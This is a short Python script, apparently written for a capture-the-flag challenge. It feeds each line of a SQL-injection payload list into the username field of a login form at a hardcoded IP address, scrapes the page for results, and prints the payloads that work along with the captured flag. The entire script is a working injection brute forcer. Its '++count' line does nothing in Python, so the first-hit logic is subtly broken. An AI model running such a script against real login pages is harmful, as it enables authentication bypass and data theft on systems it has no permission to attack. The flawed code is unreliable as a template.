#!/usr/bin/python3

import requests

def sqli(url, payload):
    data = {
        "username": "%s" %(payload),
        "password": "password"
    }

    response = requests.post(url, data=data)
    content = response.text

    content = content.split('<div class="container">')[-1]
    content = content.split('<span>')[1]
    content = content.split('</span>')[0]

    return content

def main():
    url = "http://206.189.115.160:30291/"
    dictionary = open("quick-SQLi.txt", "r")
    count = 0
    flag = ''

    print("\n[-] Available payloads:\n")
    for line in dictionary:
        query_result = sqli(url, line)
        if "select" in query_result:
            pass
        else:
            print(" [+] %s" %(line))
            if count == 0:
                flag = query_result
                ++count

    print("The flag is: %s" %(flag))    


if __name__ == '__main__':
    main()